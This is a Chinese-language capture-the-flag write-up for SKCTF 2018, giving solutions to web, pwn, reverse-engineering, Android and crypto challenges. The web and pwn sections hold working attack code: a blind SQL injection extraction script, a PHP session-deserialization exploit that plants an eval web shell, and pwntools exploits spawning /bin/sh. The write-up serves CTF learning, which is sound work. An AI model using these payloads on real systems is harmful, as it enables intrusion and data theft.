<pre><code>if (8 &gt; preg_match_all($rule, $data, $arr))</code></pre>
<p>这个条件是必须要满足的，否则会break掉，要绕过preg_match_all这个正则表达式，我们必须在data中匹配到八次以上的rule条件，也就是标点符号，数字，字母，接着读代码：</p>
<pre><code>$nn = array(&#39;punct&#39;, &#39;alpha&#39;, &#39;digit&#39;);
        foreach ($nn as $ns)
        &#123; 
            if (preg_match(&quot;/[[:$ns:]]+/&quot;, $data))
            &#123;
                $num += 1;
            &#125;
        &#125;
        if ($num &lt; 3)
            break;
        if (187667123 == $data)
        &#123;
            $da = $_GET[&#39;num&#39;];
            if (!is_numeric($da))
            &#123;
                if(27500 &lt; $da)
                &#123;
                    echo $flag;
                &#125;</code></pre>
<p>重要代码就到这结束了，仔细读一下也不难，foreach是一个循环，同样是一个正则表达式preg_match，这段代码的意思是，你要使得data中的数据匹配到超过三次，num才能不&lt;3，也就是要出现超过三种以上的数据，因为代码里规定的数据只有三种，也就是字母，数字，标点符号，所以也就是要这三种数据都出现在payload中才能满足条件，那有的同学会问了，这个条件和之前那个正则表达式有什么区别呢，之前那个要求出现八次以上，但是并不要求三种数据都出现，这里要求的是三种都出现，而且要求数字等于187667123，下一个条件是：</p>
<pre><code>if (!is_numeric($da))
            &#123;
                if(27500 &lt; $da)</code></pre>
<p>get一个num参数，is_numeric函数是判断一个参数是不是数字，而且还要求比27500大，这个函数是判断一个参数是不是数字，那么如果穿进去的参数是一个字符串就会返回0，绕过，然后要求比27500大，这就是php的弱类型，如果你传输的参数为27501a，那么强制转换后比较的数字就是27501，比27500大，也绕过，然后得到flag，最终payload为：</p>
<pre><code>url=http://127.0.0.1/other.php?num=27501a
POST=data=187667123.0e+0-0+0</code></pre>
<p>答案多样化，大家随意发挥。</p>
<h2 id="login-me-easy-edition"><a href="#login-me-easy-edition" class="headerlink" title="login me[easy edition]"></a>login me[easy edition]</h2><p>这题考察sql bool盲注，几乎没有waf。</p>
<p>payload：<code>username=admin&#39; and substr((select f14g from f1ag),1,1)=&#39;S&#39;#&amp;password=123</code></p>
<p>接下来就可以直接盲注查表了。</p>
<pre><code class="python">#-*-coding:utf-8-*-

import requests 
import time

url = &#39;http://192.168.211.131:49157/&#39; 

def check(payload):
    postdata=&#123;&#39;username&#39;:payload,&#39;password&#39;:&#39;admin&#39;&#125;
    r = requests.post(url,postdata).content
    #print r
    return &#39;Wrong password&#39; in r

flag=&#39;&#39;
s = r&#39;SKCTF&#123;&#125;1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM@_&#39;
for i in xrange(1,64):    
    for c in s:        
        payload = &#39;admin\&#39; and substr((select f14g from f1ag),%s,1)=\&#39;%s\&#39;#&#39;%(str(i),c)     
        #print payload
        if check(payload):
            flag += c
            break
    print flag
    if &#39;&#125;&#39; in flag:
        break        </code></pre>
<p>sqlmap -r 也能跑出来</p>
<h2 id="easy-web"><a href="#easy-web" class="headerlink" title="easy web"></a>easy web</h2><h3 id="hint"><a href="#hint" class="headerlink" title="hint"></a>hint</h3><ul>
<li>源代码泄露</li>
<li>善于使用搜索引擎</li>
</ul>
<h3 id="解析"><a href="#解析" class="headerlink" title="解析"></a>解析</h3><p>由源代码泄露可以知道有三个文件<br>index.php</p>
<pre><code>&lt;?php

ini_set(&#39;session.serialize_handler&#39;, &#39;php_serialize&#39;);
session_start();
echo rand();
if(isset($_POST[&#39;up_addr&#39;]))
&#123;
    include(&quot;rand_addr.php&quot;);
    if($_POST[&#39;up_addr&#39;]===$up_addr&amp;&amp;isset($_POST[&#39;str&#39;]))
    &#123;
        $str = $_POST[&#39;str&#39;];
        $_SESSION[&#39;name&#39;] = $str;
    &#125;

&#125;
</code></pre>
<p>kkkk.php</p>
<pre><code>&lt;?php

ini_set(&#39;session.serialize_handler&#39;, &#39;php&#39;);
session_start();
class  SKCTF&#123;
    var $content;
    function __destruct() &#123;
        include(&quot;rand_addr.php&quot;);
        file_put_contents(&quot;/var/www/html/upload/$up_addr.php&quot;,$this-&gt;content);
    &#125;
&#125;
</code></pre>
<p>rand_addr.php</p>
<pre><code>&lt;?php
$up_addr = str_shuffle(&#39;0123456789abcdefghijklmnopqrstuvwxyz&#39;);</code></pre>
<p>代码逻辑很简单，明显预测随机字符串，预测出来判断正确之后有个存储session的操作，然后可以发现两个文件对session的操作方式不一样，导致了session反序列化的产生。</p>
<p>分析<code>str_shuffle</code>函数的底层代码</p>
<pre><code>static void php_string_shuffle(char *str, long len TSRMLS_DC) /* &#123;&#123;&#123; */
&#123;
    long n_elems, rnd_idx, n_left;
    char temp;
    /* The implementation is stolen from array_data_shuffle       */
    /* Thus the characteristics of the randomization are the same */
    n_elems = len;

    if (n_elems &lt;= 1) &#123;
        return;
    &#125;

    n_left = n_elems;

    while (--n_left) &#123;
        rnd_idx = php_rand(TSRMLS_C);
        RAND_RANGE(rnd_idx, 0, n_left, PHP_RAND_MAX);
        if (rnd_idx != n_left) &#123;
            temp = str[n_left];
            str[n_left] = str[rnd_idx];
            str[rnd_idx] = temp;
        &#125;
    &#125;
&#125;</code></pre>
<p>可以知道<code>str_shuffle</code>是通过获取rand值来打乱字符串的，根据传进来的字符串值的长度决定了调用获取rand的次数，那么参考文章</p>
<pre><code>http://www.sjoerdlangkemper.nl/2016/02/11/cracking-php-rand/</code></pre>
<p>可以知道rand()值是可以预测的，看一下RAND_RANGE的实现</p>
<pre><code>#define RAND_RANGE(__n, __min, __max, __tmax) \
(__n) = (__min) + (long) ((double) ( (double) (__max) - (__min) + 1.0) * ((__n) / ((__tmax) + 1.0)))</code></pre>
<p>那么既然rand可以预测的话，打乱后的字符串也可以预测。</p>
<p>假如这里预测了字符串还考察了session反序列化<br>构造反序列化的payload</p>
<pre><code>&lt;?php

class  SKCTF&#123;
    var $content;
&#125;
$p0desta = new SKCTF();
$p0desta-&gt;content = &quot;&lt;?php eval(\$_POST[1]); ?&gt;&quot;;
echo &quot;|&quot;.serialize($p0desta);</code></pre>
<p>重写str_shuffle的底层代码，这里需要注意到底什么时候传入多少个rand()值，poc如下</p>
<pre><code>#encoding: utf-8
import requests
import re
import random
from ctypes import *

def RAND_RANGE(__n,__min,__max,__tmax):
    xx =  __min + ( ( (__max) - (__min) + 1.0) * ((__n) / ((__tmax) + 1.0)))
    return (int)(xx)

def str_shuffle(arr,ss):
    n_elems = len(ss)
    if(n_elems&lt;=1):
        return
    num = -1
    kk = []
    brr = []
    for m in range(32,32+n_elems+1):
        num = num+1
        arr.append((arr[m-3]+arr[m-31])%2147483647)
        brr.append(arr[num])

    n_left = n_elems
    n = -1
    n_left = n_left-1
    sss = []
    for s in ss:
        sss.append(s)
    x = 0
    while (n_left):

        n = n+1
        rnd_idx = brr[n]
        rnd_idx = RAND_RANGE(rnd_idx,0,n_left,2147483647)

        if(rnd_idx!=n_left):
            sss[rnd_idx],sss[n_left] = sss[n_left],sss[rnd_idx]
        n_left = n_left-1
        x = x + 1
    return sss

ars = []
headers=&#123;
        &#39;Connection&#39;: &#39;Keep-Alive&#39;
&#125;
s = requests.Session()
url=&#39;http://192.168.190.128:1112/index.php&#39;
for i in range(32):
    r =s.get(url=url,headers=headers)
    ars.append(int(r.text))
#print ars
payload = []
for i in range(73):
    ars.append((ars[i+1]+ars[i+29])%2147483647)
sss = str_shuffle(ars[33:65],&quot;0123456789abcdefghijklmnopqrstuvwxyz&quot;)
key = &#39;&#39;.join(sss)
print &quot;key:&quot;+key
sss1 = str_shuffle(ars[68:],&quot;0123456789abcdefghijklmnopqrstuvwxyz&quot;)
key1 = &#39;&#39;.join(sss1)
print &quot;key1:&quot;+key1
data = &#123;
    &quot;up_addr&quot;:key,
    &quot;str&quot;:&#39;|O:5:&quot;SKCTF&quot;:1:&#123;s:7:&quot;content&quot;;s:25:&quot;&lt;?php eval($_POST[1]); ?&gt;&quot;;&#125;&#39;
&#125;
print data
r=s.post(url,headers=headers,data=data)
print(r.text)
url_new = &quot;http://192.168.190.128:1112/kkkk.php&quot;
print s.get(url=url_new).content
</code></pre>
<h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h2 id="pwn1"><a href="#pwn1" class="headerlink" title="pwn1"></a>pwn1</h2><p>简单的大数字格式化字符串</p>
<pre><code class="python"># coding=utf-8
from pwn import *

p = process(&#39;./pwn1&#39;)

payload = fmtstr_payload(7, &#123;0x0804a028: 0x12345678&#125;)

p.sendline(payload)

p.interactive()</code></pre>
<h2 id="pwn2"><a href="#pwn2" class="headerlink" title="pwn2"></a>pwn2</h2><p>明显的栈溢出，很直观的漏洞在read函数，但是只有一个read，没有可以用来leak的函数，所以用Return-to-dl-resolve的解法   </p>
<ol>
<li>首先在bss段写入/bin/sh   </li>
<li>调用system函数</li>
</ol>
<pre><code class="python">#coding:utf-8
import sys
import roputils
from pwn import *


p = process(&#39;./pwn2&#39;)
elf = ELF(&#39;pwn2&#39;)

readplt = elf.plt[&#39;read&#39;]
#print hex(readplt)


#readplt = 0x8048310
bss = 0x0804A024 
vulFun = 0x0804844D
offset = 40

rop = roputils.ROP(&#39;./pwn2&#39;)
bss_addr = rop.section(&#39;.bss&#39;)

buf1 = &#39;A&#39; * offset
buf1 += p32(readplt) + p32(vulFun) + p32(0) + p32(bss_addr) + p32(100)

p.send(buf1)

buf2 =  rop.string(&#39;/bin/sh&#39;)
buf2 += rop.fill(20, buf2)
buf2 += rop.dl_resolve_data(bss_addr+20, &#39;system&#39;)
buf2 += rop.fill(100, buf2)
p.send(buf2)

buf3 = &#39;A&#39;* offset + rop.dl_resolve_call(bss_addr+20, bss_addr)
p.send(buf3)
p.interactive()</code></pre>
<h1 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h1><h2 id="BabyRE"><a href="#BabyRE" class="headerlink" title="BabyRE"></a>BabyRE</h2><p>使用gdb进行调试分析</p>
<pre><code>gdb-peda$ b main.main
Breakpoint 1 at 0x48ea30: file /root/Desktop/babyre.go, line 7.
gdb-peda$ disas main.main
Dump of assembler code for function main.main:
   0x000000000048ea30 &lt;+0&gt;: mov    rcx,QWORD PTR fs:0xfffffffffffffff8
   0x000000000048ea39 &lt;+9&gt;: lea    rax,[rsp-0x8]
   0x000000000048ea3e &lt;+14&gt;:    cmp    rax,QWORD PTR [rcx+0x10]
   0x000000000048ea42 &lt;+18&gt;:    jbe    0x48ebda &lt;main.main+426&gt;
   0x000000000048ea48 &lt;+24&gt;:    sub    rsp,0x88
   0x000000000048ea4f &lt;+31&gt;:    mov    QWORD PTR [rsp+0x80],rbp
   0x000000000048ea57 &lt;+39&gt;:    lea    rbp,[rsp+0x80]
   0x000000000048ea5f &lt;+47&gt;:    lea    rax,[rip+0x1087a]        # 0x49f2e0
   0x000000000048ea66 &lt;+54&gt;:    mov    QWORD PTR [rsp],rax
   0x000000000048ea6a &lt;+58&gt;:    call   0x40e470 &lt;runtime.newobject&gt;
   0x000000000048ea6f &lt;+63&gt;:    mov    rax,QWORD PTR [rsp+0x8]
   0x000000000048ea74 &lt;+68&gt;:    mov    QWORD PTR [rsp+0x48],rax
   0x000000000048ea79 &lt;+73&gt;:    mov    ecx,0x1
   0x000000000048ea7e &lt;+78&gt;:    jmp    0x48eb09 &lt;main.main+217&gt;
   0x000000000048ea83 &lt;+83&gt;:    inc    rcx
   0x000000000048ea86 &lt;+86&gt;:    cmp    rcx,0xf
   0x000000000048ea8a &lt;+90&gt;:    jge    0x48ebb9 &lt;main.main+393&gt;
   0x000000000048ea90 &lt;+96&gt;:    mov    rdx,QWORD PTR [rax+0x8]
   0x000000000048ea94 &lt;+100&gt;:   mov    rbx,QWORD PTR [rax]
   0x000000000048ea97 &lt;+103&gt;:   cmp    rcx,rdx
   0x000000000048ea9a &lt;+106&gt;:   jae    0x48ebd3 &lt;main.main+419&gt;
   0x000000000048eaa0 &lt;+112&gt;:   movzx  edx,BYTE PTR [rbx+rcx*1]
   0x000000000048eaa4 &lt;+116&gt;:   lea    rbx,[rip+0x324b8]        # 0x4c0f63
   0x000000000048eaab &lt;+123&gt;:   movzx  esi,BYTE PTR [rbx+rcx*1]
   0x000000000048eaaf &lt;+127&gt;:   xor    edx,esi
   0x000000000048eab1 &lt;+129&gt;:   cmp    dl,0x3
   0x000000000048eab4 &lt;+132&gt;:   jne    0x48eb6f &lt;main.main+319&gt;
   0x000000000048eaba &lt;+138&gt;:   cmp    rcx,0xe
   0x000000000048eabe &lt;+142&gt;:   jne    0x48ea83 &lt;main.main+83&gt;
   0x000000000048eac0 &lt;+144&gt;:   xorps  xmm0,xmm0
   0x000000000048eac3 &lt;+147&gt;:   movups XMMWORD PTR [rsp+0x50],xmm0
   0x000000000048eac8 &lt;+152&gt;:   lea    rax,[rip+0x10811]        # 0x49f2e0
   0x000000000048eacf &lt;+159&gt;:   mov    QWORD PTR [rsp+0x50],rax
   0x000000000048ead4 &lt;+164&gt;:   lea    rcx,[rip+0x42df5]        # 0x4d18d0 &lt;main.statictmp_1&gt;
   0x000000000048eadb &lt;+171&gt;:   mov    QWORD PTR [rsp+0x58],rcx
   0x000000000048eae0 &lt;+176&gt;:   lea    rdx,[rsp+0x50]
   0x000000000048eae5 &lt;+181&gt;:   mov    QWORD PTR [rsp],rdx
   0x000000000048eae9 &lt;+185&gt;:   mov    QWORD PTR [rsp+0x8],0x1
   0x000000000048eaf2 &lt;+194&gt;:   mov    QWORD PTR [rsp+0x10],0x1
   0x000000000048eafb &lt;+203&gt;:   call   0x4831a0 &lt;fmt.Println&gt;
   0x000000000048eb00 &lt;+208&gt;:   xor    eax,eax
   0x000000000048eb02 &lt;+210&gt;:   mov    ecx,eax
   0x000000000048eb04 &lt;+212&gt;:   mov    rax,QWORD PTR [rsp+0x48]
   0x000000000048eb09 &lt;+217&gt;:   test   cl,cl
   0x000000000048eb0b &lt;+219&gt;:   je     0x48ebc3 &lt;main.main+403&gt;
   0x000000000048eb11 &lt;+225&gt;:   mov    BYTE PTR [rsp+0x47],cl
   0x000000000048eb15 &lt;+229&gt;:   xorps  xmm0,xmm0
   0x000000000048eb18 &lt;+232&gt;:   movups XMMWORD PTR [rsp+0x70],xmm0
   0x000000000048eb1d &lt;+237&gt;:   lea    rcx,[rip+0xda1c]        # 0x49c540
   0x000000000048eb24 &lt;+244&gt;:   mov    QWORD PTR [rsp+0x70],rcx
   0x000000000048eb29 &lt;+249&gt;:   mov    QWORD PTR [rsp+0x78],rax
   0x000000000048eb2e &lt;+254&gt;:   lea    rdx,[rip+0x30dc8]        # 0x4bf8fd
   0x000000000048eb35 &lt;+261&gt;:   mov    QWORD PTR [rsp],rdx
   0x000000000048eb39 &lt;+265&gt;:   mov    QWORD PTR [rsp+0x8],0x2
   0x000000000048eb42 &lt;+274&gt;:   lea    rbx,[rsp+0x70]
   0x000000000048eb47 &lt;+279&gt;:   mov    QWORD PTR [rsp+0x10],rbx
   0x000000000048eb4c &lt;+284&gt;:   mov    QWORD PTR [rsp+0x18],0x1
   0x000000000048eb55 &lt;+293&gt;:   mov    QWORD PTR [rsp+0x20],0x1
   0x000000000048eb5e &lt;+302&gt;:   call   0x489180 &lt;fmt.Scanf&gt;
   0x000000000048eb63 &lt;+307&gt;:   mov    rax,QWORD PTR [rsp+0x48]
   0x000000000048eb68 &lt;+312&gt;:   xor    ecx,ecx
   0x000000000048eb6a &lt;+314&gt;:   jmp    0x48ea86 &lt;main.main+86&gt;
   0x000000000048eb6f &lt;+319&gt;:   xorps  xmm0,xmm0
   0x000000000048eb72 &lt;+322&gt;:   movups XMMWORD PTR [rsp+0x60],xmm0
   0x000000000048eb77 &lt;+327&gt;:   lea    rax,[rip+0x10762]        # 0x49f2e0
   0x000000000048eb7e &lt;+334&gt;:   mov    QWORD PTR [rsp+0x60],rax
   0x000000000048eb83 &lt;+339&gt;:   lea    rcx,[rip+0x42d36]        # 0x4d18c0 &lt;main.statictmp_0&gt;
   0x000000000048eb8a &lt;+346&gt;:   mov    QWORD PTR [rsp+0x68],rcx
   0x000000000048eb8f &lt;+351&gt;:   lea    rdx,[rsp+0x60]
   0x000000000048eb94 &lt;+356&gt;:   mov    QWORD PTR [rsp],rdx
   0x000000000048eb98 &lt;+360&gt;:   mov    QWORD PTR [rsp+0x8],0x1
   0x000000000048eba1 &lt;+369&gt;:   mov    QWORD PTR [rsp+0x10],0x1
   0x000000000048ebaa &lt;+378&gt;:   call   0x4831a0 &lt;fmt.Println&gt;
   0x000000000048ebaf &lt;+383&gt;:   movzx  eax,BYTE PTR [rsp+0x47]
   0x000000000048ebb4 &lt;+388&gt;:   jmp    0x48eb02 &lt;main.main+210&gt;
   0x000000000048ebb9 &lt;+393&gt;:   movzx  eax,BYTE PTR [rsp+0x47]
   0x000000000048ebbe &lt;+398&gt;:   jmp    0x48eb02 &lt;main.main+210&gt;
   0x000000000048ebc3 &lt;+403&gt;:   mov    rbp,QWORD PTR [rsp+0x80]
   0x000000000048ebcb &lt;+411&gt;:   add    rsp,0x88
   0x000000000048ebd2 &lt;+418&gt;:   ret    
   0x000000000048ebd3 &lt;+419&gt;:   call   0x424f70 &lt;runtime.panicindex&gt;
   0x000000000048ebd8 &lt;+424&gt;:   ud2    
   0x000000000048ebda &lt;+426&gt;:   call   0x44d270 &lt;runtime.morestack_noctxt&gt;
   0x000000000048ebdf &lt;+431&gt;:   jmp    0x48ea30 &lt;main.main&gt;
End of assembler dump.

</code></pre>
<p>73行一层while循环, 然后跳到217行, 若符合while条件, 向下执行到302行调用Scanf函数，然后再跳回86行, 进入一个i = 0; i &lt; 15的循环, 在116行加载一个字符串[0x4c0f63]<code>PH@WExabazd3qf~</code>(使用 x /s 0x4c0f63查看), 然后进行逐位异或, 若异或结<br>果不为1, 则跳出循环Printf(“Wrong”), 否则继续循环, 直到循环结束输出Printf(“Right”)</p>
<p>源码:</p>
<pre><code class="golang">package main

import (
&quot;fmt&quot;
)

func main() &#123;
    var i = true
    str := &quot;&quot;
    str2 := &quot;PH@WExabazd3qf~&quot;
    for i &#123;
        fmt.Scanf(&quot;%s&quot;, &amp;str)
        for b:=0; b &lt; 15; b++ &#123;
            if str[b] ^ str2[b] != 3 &#123;
                fmt.Println(&quot;Wrong&quot;)
                break
            &#125; else &#123;
                if b == 14 &#123;
                    fmt.Println(&quot;Right&quot;)
                    i = !true
                    break
                &#125;
            &#125;
        &#125;
    &#125;
&#125;</code></pre>
<h2 id="intel"><a href="#intel" class="headerlink" title="intel"></a>intel</h2><p>虽然是mac程序，但是ida也能分析<br>直接上脚本</p>
<pre><code>def calc(result):
    for i in range(32,128):
        k = i
        for j in range(4):
            tmp = k*2
            if tmp &amp; 0x100:
                tmp |= 1
            k = tmp &amp; 255
        if k == result:
            return chr(i)
string=&#39;44F6F557F5C696B656F51425D4F596E63747275736479603E6F3A392&#39;.decode(&#39;hex&#39;)
flag = &#39;&#39;
for ch in string:
    flag+=calc(ord(ch))

print f_d</code></pre>
<h2 id="getit"><a href="#getit" class="headerlink" title="getit"></a>getit</h2><p>一个exe文件，查壳<br><img src="http://oymyxu3ku.bkt.clouddn.com/TIM%E5%9B%BE%E7%89%8720180510184251.png" alt="image"><br>用IDA打开，F12查看字符串，发现几个关键句<br><img src="http://oymyxu3ku.bkt.clouddn.com/TIM%E6%88%AA%E5%9B%BE20180510184507.jpg" alt="image"><br>双击进入到具体位置<br><img src="http://oymyxu3ku.bkt.clouddn.com/TIM%E6%88%AA%E5%9B%BE20180510184601.jpg" alt="image"><br>在函数名上按X，寻找到函数的具体位置，F5查看伪代码<br><img src="http://oymyxu3ku.bkt.clouddn.com/TIM%E6%88%AA%E5%9B%BE20180510184601.jpg" alt="image"><br>分析一下语境，发现与“U7kD0VwFt2d0DUUfVxdQEMl=ZVd=”这串字符串有关，既然和flag接近，那就是该字符串经过某些转换才能得到flag<br>观察该字符串，猜测与密码有关，看到两个等号联想到base64，但是格式又不像，猜测栅栏密码，解密得到flag。</p>
<p>-&gt; 栅栏密码</p>
<p><code>U0tDVEZ7V2UxMVkwdUdldDF0fQ==</code></p>
<p>-&gt;base64 decode</p>
<p><code>SKCTF&#123;We11Y0uGet1t&#125;</code></p>
<h1 id="Android"><a href="#Android" class="headerlink" title="Android"></a>Android</h1><h2 id="爆破大法好"><a href="#爆破大法好" class="headerlink" title="爆破大法好"></a>爆破大法好</h2><p>见名知意，本题就是采用爆破的方法得到flag.</p>
<p><img src="/images/SKCTF2018/android1.png" alt="android1"></p>
<p>关键代码如上，可以看到程序首先查看输入的字符串的长度是否为6，然后将输入进行MD5加密，将加密后的结果与result进行比较。</p>
<p>因为采用的MD5加密，所以无法直接解密，采用爆破的方法得到flag。</p>
<p>Flag为skctf{soeasy}</p>
<h2 id="getFlag"><a href="#getFlag" class="headerlink" title="getFlag"></a>getFlag</h2><p>程序打开后为一个网页，然后通过点击网页链接调用encrypt类，</p>
<p><img src="/images/SKCTF2018/android2.png" alt="android"></p>
<p>将输入每四位进行循环左移，input[0,1,2,3,4,5,6…]变为input[1,2,3,0,5,6,7,4…]</p>
<p><img src="/images/SKCTF2018/android3.png" alt="android"></p>
<p>获取程序的签名值，这地方为了降低难度，打开了Log，不知道这是获取签名也可以做，查看一下log即可得到签名值。</p>
<p><img src="/images/SKCTF2018/android4.png" alt="android"></p>
<p>将上面左移后的结果与签名的偶数位进行异或得到v5，最后将v5与result进行比较。</p>
<p>反推一下算法过程即可得到flag。Flag为skctf{congratulation!!}</p>
<p>脚本如下：</p>
<pre><code class="python">end = [13, 92, 5, 87, 81, 22, 65, 22, 89, 70, 94, 8, 91, 67, 64, 90]
s = &quot;B026B34B00BB4CD2862175D157B1AD5EE89A407C&quot;
ss =&quot;b026b34b00bb4cd2862175d157b1ad5ee89a407c&quot;
flag =&quot;&quot;
for i in range(0,16):
    flag += (chr(int(end[i]) ^ ord(ss[i*2])))
print(flag)
flag = list(flag)
for i in range(0,4):
    c = flag[(3-i)*4+3]

    for j in range(0,3):
        flag[(3-i) * 4 + (2-j) + 1] = flag[(3-i) * 4 + (2-j)]
    flag[(3-i) * 4] = c
    print(flag)
for i in range(0,16):
    print(flag[i],end=&quot;&quot;)
#congratulation!!
</code></pre>
<h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="LFSR"><a href="#LFSR" class="headerlink" title="LFSR"></a>LFSR</h2><p>根据图可知，Y是LFSR产生序列与FLAG异或得到的结果，已知Y，只要生成加密时使用的序列即可得到flag。<br>已知LFSR初始状态为17，即10001。则根据LFSR原理，将其表示为a1,a2,a3,a4,a5。首先输出的是a1，即LFSR右端为a1，顺序向左排列。<br>第一次运算，移位输出a1，将a1与a4进行异或运算得到a6：<br><code>a6 = a1 ^ a4</code><br>第一次运算后，LFSR中由右至左为 11000，重复操作，继续输出。<br>推广：</p>
<pre><code>n&gt;5时，a(n) = a(n-5) ^ a(n-2)</code></pre>
<p>又知Y长度为184，则依次运算生成184位初始序列：</p>
<pre><code>1101110011010001000000011110111101011001010011111100000101000110011000010011000001100101101110010010001110011001011110111110100010001110111110110110011111010111110001100001101000101010</code></pre>
<p>将其与Y进行异或即可得到FLAG的二进制，转为16进制后，再转换为字符即可。</p>
<pre><code>flag：SKCTF&#123;D0_YoU_Kn0w_Lf5R&#125;</code></pre>
<pre><code class="python">
# - UTF-8 -
# LSFR_decode
# _Bonjour
# 

Y = &quot;1101110011010001000000011110111101011001010011111100000101000110011000010011000001100101101110010010001110011001011110111110100010001110111110110110011111010111110001100001101000101010&quot;
len = len(Y)
print(len) # 求密文长度

# initial_state = 17
# initial_state = &quot;00010001&quot;
output = &#39;10001&#39;

# 根据图(a4,a3,a2,a1,a0)，f = list[i] ^ list[i + 3]
for i in range(184):
    output += str(int(output[i]) ^ int(output[i + 3]))
print(&quot;output = &quot; + output)

flag = &#39;&#39;
for i in range(184):
    flag += str(int(output[i]) ^ int(Y[i]))
print(&quot;flag = &quot; + flag)

list = &#39;&#39;
idx = 0
while idx &lt; len:
    list += chr(int(flag[idx:idx+8],2))
    idx += 8
print(list)
</code></pre>
<h2 id="easy-rsa"><a href="#easy-rsa" class="headerlink" title="easy rsa"></a>easy rsa</h2><p>低指数幂爆破攻击，脚本如下</p>
<pre><code>import libnum

c=20007698782339834246219328724588364459038474898597431254441716723329047692482286669616878491497181438826429104573158490197780427343059002311390665150204203593904674308567972583524863664412573864470357485299378319457792659062998310715680020892095430469672971488726545126438904961637
n= 127736277372703302601056543119422673263688414162130452012271136376613506149677023810059879551077756689012265602068781726322860263396788055341495459092641851239465778777954763378423777055786390661741851297248439205933852145044703803764388021585419049988085302710871206091591995497858682344782684500134395300049


for e in range(2,10):
    m = libnum.nroot(c,e)
    if m**e==c:
        break

print &quot;e:&quot;,e
print &quot;m:&quot;,m
flag = libnum.n2s(m)
print flag</code></pre>
<h2 id="看到的就是全部"><a href="#看到的就是全部" class="headerlink" title="看到的就是全部"></a>看到的就是全部</h2><p>相关知识：caser + 栅栏 + unicode </p>
<p>cipher: </p>
<pre><code class="Unicode">\u4f\u50\u53\u79\u41\u47\u42\u7a\u47\u42\u61\u4b\u32\u59\u33\u7d\u59\u7b\u31\u69\u6f\u50\u6e</code></pre>
<p>unicode decode</p>
<p>栅栏 key:3</p>
<p>凯撒caser</p>
<p>plain: SKCTF{We1cOmE2sKCTF3rd}</p>
<h2 id="FairPlay"><a href="#FairPlay" class="headerlink" title="FairPlay"></a>FairPlay</h2><p>相关知识：fairplay加密<br>参考原理：<br><a href="https://blog.csdn.net/qq_25968195/article/details/70343910">https://blog.csdn.net/qq_25968195/article/details/70343910</a><br>具体加密步骤：</p>
<ul>
<li><p>根据key构建5*5矩阵<br>j   u   s   t   d<br>o   a   b   c   e<br>f   g   h   k   l<br>m   n   p   q   r<br>v   w   x   y   z</p>
</li>
<li><p>对密文进行两两分组<br>（** 若两元素相同（a == b）：于两元素间插入x<br>** 若两元素同一行(a / 5 == b / 5)：取右（+1）元素<br>** 若两元素同一列(a % 5 == b % 5)：取下（+5）元素<br>** 若两元素不同行不同列：以两元素为对角线构建矩阵，分别取该矩阵内的同行（a + (|b - a| % 5) 和 b - (|b - a| % 5)）元素）</p>
</li>
</ul>
<pre><code class="python">  # Playfair_encode
  # 
  # 本代码已知约定：
    # j -&gt; i
    # 若 p1=p2，则插入一个字母(X)于重复字母之间；
    # 若明文字母数为奇数时，则在明文的末端添加(Z)作为填充；
    # 
  # Bonjour_

  # 移除密钥中已存在的字符
  def Remove(key):
    key = key.lower() # 将所有大写字母转为小写
    text = &#39;&#39;
    for c in key:
      if c == &#39;i&#39;:
        c = &#39;j&#39;
      if c in text:
        continue
      else:
        text+=c
    return text

  # 整合密钥不重复字母和字母表剩余字母
  def Ordertext(text):
    Alphabet = &quot;abcdefghijklmnopqrstuvwxyz&quot;
    for c in Alphabet:
      if c == &#39;i&#39;:
        c = &#39;j&#39;
      if c not in text:
        text+=c
    return text

  # 根据已确定顺序构造5*5矩阵
  def CreatMatrix(text):
    Matrix = []
    cnt = 0
    for i in range(25):
      Matrix.append(text[cnt:cnt+1])
      cnt+=1
    return Matrix

  # 查找指定元素
  def Search(Matrix,c):
    if c == &#39;i&#39;:
      c = &#39;j&#39;
    cnt = 0
    for i in Matrix:
      if i == c:
        # print(cnt)
        return cnt # 返回元素位置
      cnt = cnt + 1
    return -1

  def Abs(a,b):
    if a &gt; b:
      return a - b
    else:
      return b - a

  # 进行元素变化 ##&#39;A&#39; = 65, &#39;a&#39; = 97
  # # 若两元素同一行(a / 5 == b / 5)：取右（+1）元素
  def Change1(Matrix,x):
    if int(x / 5) != int((x + 1) / 5):
      x = int(int(x / 5) * 5)
      # print(x)
    else:
      x = x + 1
    # print(&quot;+1+&quot;)
    return Matrix[x]

  # 若两元素同一列(a % 5 == b % 5)：取下（+5）元素
  def Change2(Matrix,x):
    x = (x + 5) % 25
    return Matrix[x]

  # 若两元素不同行不同列：以两元素为对角线构建矩阵，分别取该矩阵内的同行（a + (|b - a| % 5) 和 b - (|b - a| % 5)）元素
  def Change3(Matrix,x,diff):
    x = x + diff
    return Matrix[x]


  # 两两分组
  # 若两元素相同（a == b）：于两元素间插入x
  # 若两元素同一行(a / 5 == b / 5)：取右（+1）元素
  # 若两元素同一列(a % 5 == b % 5)：取下（+5）元素
  # 若两元素不同行不同列：以两元素为对角线构建矩阵，分别取该矩阵内的同行（a + (|b - a| % 5) 和 b - (|b - a| % 5)）元素
  def encode(Matrix,plain,len):
    cnt = 0
    text = &#39;&#39;
    while(cnt &lt; len):
      a = plain[cnt]
      b = plain[cnt + 1]
      pos_a = Search(Matrix,a)
      pos_b = Search(Matrix,b)
      # print(int(pos_a / 5))
      # print(int(pos_b / 5))
      # c = &#39;a&#39;
      # c = ord(c) + 1 //ord()：将字符转化为整数值
      # print(chr(c)) //输出&#39;b&#39;
      if pos_a == pos_b:
        text += a
        text += &#39;x&#39;
        text += a
      elif int(pos_a / 5) == int(pos_b / 5):
        text += Change1(Matrix,pos_a)
        text += Change1(Matrix,pos_b)
      elif pos_a % 5 == pos_b % 5:
        text += Change2(Matrix,pos_a)
        text += Change2(Matrix,pos_b)
      # 根据两种矩阵格式区分
      elif pos_a % 5 &lt; pos_b % 5:
        diff = pos_b % 5 - pos_a % 5
        if pos_a &gt; pos_b:
          text += Change3(Matrix,pos_a,diff)
          text += Change3(Matrix,pos_b,-diff)
        else:
          text += Change3(Matrix,pos_a,diff)
          text += Change3(Matrix,pos_b,-diff)
      elif pos_a % 5 &gt; pos_b % 5:
        diff = pos_a % 5 - pos_b % 5
        if pos_a &gt; pos_b:
          text += Change3(Matrix,pos_a,-diff)
          text += Change3(Matrix,pos_b,diff)
        else:
          text += Change3(Matrix,pos_a,-diff)
          text += Change3(Matrix,pos_b,diff)
      cnt+=2
    return text


